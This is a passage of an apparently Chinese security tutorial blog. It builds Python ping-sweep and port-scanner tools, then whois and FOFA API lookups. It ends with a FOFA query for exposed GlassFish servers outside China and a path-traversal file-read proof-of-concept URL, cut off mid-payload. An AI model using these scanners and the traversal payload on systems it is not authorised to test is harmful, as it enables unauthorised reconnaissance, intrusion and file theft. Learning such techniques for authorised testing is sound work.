class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">count,ip</span>):<br>    queue = Queue()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>):<br>        queue.put(ip+<span class="hljs-string">&#x27;.&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br><br>    <span class="hljs-comment">#多线程</span><br>    threads = []<br>    thread_count = <span class="hljs-built_in">int</span>(count)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(thread_count):<br>        threads.append(CScan(queue))<br>    <span class="hljs-comment">#开启线程</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    count = <span class="hljs-number">16</span><br>    ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要扫描的ip段：&quot;</span>)<br>    start(count,ip)<br><br></code></pre></td></tr></table></figure><h2 id="端口扫描器"><a href="#端口扫描器" class="headerlink" title="端口扫描器"></a>端口扫描器</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-comment">#核心功能 待优化  结合C段扫描的功能</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_port_open</span>(<span class="hljs-params">host,port</span>):<br>    s = socket.socket()<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((host,port))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>host = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;enter the host:&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#版本1  扫描C段的同时扫描存活主机的端口号</span><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen,PIPE<br><br><span class="hljs-comment">#常见端口  自定义</span><br>common_port = [<span class="hljs-string">&#x27;21&#x27;</span>,<span class="hljs-string">&#x27;22&#x27;</span>,<span class="hljs-string">&#x27;80&#x27;</span>,<span class="hljs-string">&#x27;1433&#x27;</span>,<span class="hljs-string">&#x27;1521&#x27;</span>,<span class="hljs-string">&#x27;3306&#x27;</span>,<span class="hljs-string">&#x27;8080&#x27;</span>,<span class="hljs-string">&#x27;23&#x27;</span>,<span class="hljs-string">&#x27;25&#x27;</span>,<span class="hljs-string">&#x27;53&#x27;</span>,<span class="hljs-string">&#x27;137&#x27;</span>,<span class="hljs-string">&#x27;138&#x27;</span>,<span class="hljs-string">&#x27;139&#x27;</span>,<span class="hljs-string">&#x27;443&#x27;</span>,<span class="hljs-string">&#x27;7890&#x27;</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_port_open</span>(<span class="hljs-params">host,port</span>):<br>    s = socket.socket()<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((host,port))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CScan</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            ip = self.queue.get()<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment">#执行ping命令</span><br>                check_ping = Popen(<span class="hljs-string">&quot;ping &#123;0&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(ip),stdin=PIPE,stdout=PIPE,shell=<span class="hljs-literal">True</span>)<br>                data = check_ping.stdout.read()<br>                <span class="hljs-comment">#数据要转为str</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;TTL&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(data):<br>                    <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; is up!\n&quot;</span>)<br>                    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> common_port:<br>                        <span class="hljs-keyword">if</span> is_port_open(ip,<span class="hljs-built_in">int</span>(p)):<br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] &#x27;</span>+ip+<span class="hljs-string">&#x27;:&#x27;</span>+p+<span class="hljs-string">&quot; is open!&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; 不在线 \n&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">count,ip</span>):<br>    queue = Queue()<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>):<br>        queue.put(ip+<span class="hljs-string">&#x27;.&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br><br>    <span class="hljs-comment">#多线程</span><br>    threads = []<br>    thread_count = <span class="hljs-built_in">int</span>(count)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(thread_count):<br>        threads.append(CScan(queue))<br>    <br>    <span class="hljs-comment">#开启线程</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    count = <span class="hljs-number">16</span><br>    ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要扫描的ip段：&quot;</span>)<br>    start(count,ip)<br><br></code></pre></td></tr></table></figure><p>优化：</p><p>思路：</p><p>1.使用argparse模块  写成脚本形式</p><p>2.参数设置</p><p>-c  –Cduan  仅扫描输入ip的c段</p><p>-p  –port  仅扫描输入ip的端口号（默认使用常见端口测试）</p><p>-t  –target   指定目标</p><p>-a  –all   扫描输入的ip的C段并且扫描每个存活ip的端口开放情况</p><p>-ap –all_port  全端口扫描 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen,PIPE<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser<br><br><span class="hljs-comment">#常见端口  自定义</span><br>common_port = [<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">23</span>,<span class="hljs-number">25</span>,<span class="hljs-number">53</span>,<span class="hljs-number">137</span>,<span class="hljs-number">138</span>,<span class="hljs-number">139</span>,<span class="hljs-number">443</span>,<span class="hljs-number">7890</span>]<br><br><span class="hljs-comment">#端口扫描核心代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_port_open</span>(<span class="hljs-params">ip,port</span>):<br>    s = socket.socket()<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((ip,port))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">pScan</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue,args</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br>        self.args = args<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        args = self.args<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            ip = self.queue.get()<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment">#端口扫描</span><br>                <span class="hljs-keyword">if</span> args.portScan:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;target:&quot;</span>+ip)<br>                    <span class="hljs-keyword">if</span> args.all_port:<br>                        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">65536</span>):<br>                            <span class="hljs-keyword">if</span> is_port_open(ip,p):<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] &quot;</span>+ip+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is open!&quot;</span>)<br>                            <span class="hljs-keyword">else</span>:<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] &quot;</span>+ip+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is not open!&quot;</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> common_port:<br>                            <span class="hljs-comment">#print(p)</span><br>                            <span class="hljs-keyword">if</span> is_port_open(ip,p):<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] &quot;</span>+ip+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is open!&quot;</span>)<br>                            <span class="hljs-keyword">else</span>:<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] &quot;</span>+ip+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is not open!&quot;</span>)<br>                <span class="hljs-comment">#C段扫描</span><br>                <span class="hljs-keyword">elif</span> args.CduanScan:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;target:&quot;</span>+ip)<br>                    <span class="hljs-comment">#执行ping命令</span><br>                    check_ping = Popen(<span class="hljs-string">&quot;ping &#123;0&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(ip),stdin=PIPE,stdout=PIPE,shell=<span class="hljs-literal">True</span>)<br>                    data = check_ping.stdout.read()<br>                    <br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;TTL&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(data):<br>                        <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; is up!&quot;</span>)<br>                        <span class="hljs-comment">#判断是否两者一起</span><br>                        <span class="hljs-keyword">if</span> args.all_scan:<br>                            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> common_port:<br>                                <span class="hljs-keyword">if</span> is_port_open(ip,p):<br>                                    <span class="hljs-comment">#数据要转为str</span><br>                                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] &#x27;</span>+ip+<span class="hljs-string">&#x27;:&#x27;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is open!&quot;</span>)<br>                                <span class="hljs-keyword">else</span>:<br>                                    <span class="hljs-keyword">pass</span><br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; 不在线 \n&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">count,args</span>):<br>    queue = Queue()<br>    <span class="hljs-comment">#根据命令行参数来判断传入队列的ip信息</span><br>    <span class="hljs-keyword">if</span> args.portScan:<br>        queue.put(args.target)<br>    <span class="hljs-keyword">elif</span> args.CduanScan:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>):<br>            queue.put(args.target+<span class="hljs-string">&#x27;.&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br>        <br>    <span class="hljs-comment">#多线程</span><br>    threads = []<br>    thread_count = <span class="hljs-built_in">int</span>(count)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(thread_count):<br>        threads.append(pScan(queue,args))<br>    <span class="hljs-comment">#开启线程</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-comment">#脚本参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setParser</span>():<br>    parser = ArgumentParser(<br>        prog = <span class="hljs-string">&quot;端口+C段扫描器&quot;</span>,<br>        description = <span class="hljs-string">&quot;r1&#x27;s tool&quot;</span><br>    )<br><br>    <span class="hljs-comment">#定义命令行参数</span><br>    parser.add_argument(<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;--CduanScan&quot;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;仅扫描C段&quot;</span>,action=<span class="hljs-string">&quot;store_true&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-p&quot;</span>,<span class="hljs-string">&quot;--portScan&quot;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;仅扫描端口（默认使用常用端口号）&quot;</span>,action=<span class="hljs-string">&quot;store_true&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-t&quot;</span>,<span class="hljs-string">&quot;--target&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;指定目标&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-a&quot;</span>,<span class="hljs-string">&quot;--all_scan&quot;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;扫描输入的ip段的C段和存活ip的端口开放情况（默认使用常用端口号）&quot;</span>,action=<span class="hljs-string">&quot;store_true&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-ap&quot;</span>,<span class="hljs-string">&quot;--all_port&quot;</span>,action=<span class="hljs-string">&quot;store_true&quot;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;全端口扫描&quot;</span>)<br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    args = setParser()<br>    <span class="hljs-keyword">if</span> args.target:<br>        start(<span class="hljs-number">16</span>,args)<br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230922164531423.png" alt="image-20230922164531423"></p><p>C段扫描：</p><img src="/img/image-20230922165237281.png" alt="image-20230922165237281" style="zoom:67%;" /><p>端口扫描：</p><img src="/img/image-20230922170227265.png" alt="image-20230922170227265" style="zoom:67%;" /><p>扫C段并且扫描存活主机的端口：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python .\pScanV2<span class="hljs-selector-class">.py</span> -t xxx -<span class="hljs-selector-tag">a</span> -c<br></code></pre></td></tr></table></figure><h2 id="whois信息收集"><a href="#whois信息收集" class="headerlink" title="whois信息收集"></a>whois信息收集</h2><p>思路：</p><p>1.判断此域名是否存在   </p><p>2.使用whois命令（pip install python-whois）或者调用网站(<a href="https://whois.chinaz.com/)%E6%9D%A5%E6%9F%A5%E8%AF%A2">https://whois.chinaz.com/)来查询</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> whois<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_registered</span>(<span class="hljs-params">domain_name</span>):<br>    <span class="hljs-keyword">try</span>:<br>        w = whois.whois(domain_name)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(w.domain_name)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    dms = [<br>        <span class="hljs-string">&#x27;baidu.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;zhihu.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;sadasdnjkbgadklbgads.com&#x27;</span><br>    ]<br>    <span class="hljs-keyword">for</span> dm <span class="hljs-keyword">in</span> dms:<br>        <span class="hljs-built_in">print</span>(dm,<span class="hljs-string">&quot; is registered&quot;</span> <span class="hljs-keyword">if</span> is_registered(dm) <span class="hljs-keyword">else</span> <span class="hljs-string">&quot; is not registered&quot;</span>)<br>        <br>        <br><span class="hljs-comment">#模块化：        </span><br><span class="hljs-keyword">import</span> whois<br><span class="hljs-keyword">from</span> validate_domains <span class="hljs-keyword">import</span> is_registered<br><br>domain_name = <span class="hljs-string">&quot;baidu.com&quot;</span><br><br><span class="hljs-keyword">if</span> is_registered(domain_name):<br>    whois_info = whois.whois(domain_name)<br>    <span class="hljs-built_in">print</span>(whois_info)<br>    <br></code></pre></td></tr></table></figure><h2 id="fofaAPI的使用"><a href="#fofaAPI的使用" class="headerlink" title="fofaAPI的使用"></a>fofaAPI的使用</h2><p>API接口文档：<a href="https://fofa.info/api">https://fofa.info/api</a></p><ul><li>普通查询</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">curl -X GET <span class="hljs-string">&quot;https://fofa.info/api/v1/search/all?email=xxx&amp;key=xxx&amp;qbase64=xxx&quot;</span><br><br><span class="hljs-comment">#python方式：</span><br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;https://fofa.info/api/v1/search/all?email=your_email&amp;key=fofa_api&amp;qbase64=query_sentence&quot;</span><br><br>res = requests.get(url)<br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><ul><li>host聚合</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">https://fofa.info/api/v1/host/<span class="hljs-number">103.41</span><span class="hljs-number">.167</span><span class="hljs-number">.234</span>?email=your_email&amp;key=your_key<br><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;https://fofa.info/api/v1/host/xxx.xxx.xxx.xxx?email=xxx&amp;key=xxx&quot;</span><br><br>res = requests.get(url)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230922210843955.png" alt="image-20230922210843955"></p><p><img src="/img/image-20230914112126185.png" alt="image-20230914112126185"></p><ul><li>sdk</li></ul><p><a href="https://github.com/fofapro/fofa-py">https://github.com/fofapro/fofa-py</a></p><p>下载解压  该目录下执行python .&#x2F;setup.py install</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> fofa<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    email, key = (<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment"># 输入email和key</span><br>    client = fofa.Client(email, key)                <span class="hljs-comment"># 将email和key传入fofa.Client类进行初始化和验证，并得到一个fofa client对象</span><br>    query_str = <span class="hljs-string">&#x27;header=&quot;thinkphp&quot; || header=&quot;think_template&quot;&#x27;</span><br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">51</span>):                       <span class="hljs-comment"># 从第1页查到第50页</span><br>        <span class="hljs-comment"># fpoint = client.get_userinfo()[&quot;fofa_point&quot;]      # 查询F点剩余数量</span><br>        <span class="hljs-comment"># if fpoint &lt; 100:</span><br>        <span class="hljs-comment">#     break                                   # 当F点小于100时，不再获取数据</span><br>        <span class="hljs-keyword">try</span>:<br>            data = client.search(query_str, size=<span class="hljs-number">100</span>, page=page, fields=<span class="hljs-string">&quot;ip,city&quot;</span>)  <span class="hljs-comment"># 查询第page页数据的ip和城市</span><br>            <span class="hljs-keyword">for</span> ip, city <span class="hljs-keyword">in</span> data[<span class="hljs-string">&quot;results&quot;</span>]:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;%s,%s&quot;</span>%(ip,city))             <span class="hljs-comment"># 打印出每条数据的ip和城市</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;账号信息错误&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="fofa实战"><a href="#fofa实战" class="headerlink" title="fofa实战"></a>fofa实战</h3><p>例子：<a href="https://www.secpulse.com/archives/42277.html">https://www.secpulse.com/archives/42277.html</a>  应用服务器glassfish任意文件读取漏洞</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sas">FOFA语法：<span class="hljs-string">&quot;glassfish&quot;</span> <span class="hljs-variable">&amp;&amp;</span> port=<span class="hljs-string">&quot;4848&quot;</span> <span class="hljs-variable">&amp;&amp;</span> country!=<span class="hljs-string">&quot;CN&quot;</span><br>linuxPOC:http://localhost:4848/theme/META-INF/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title 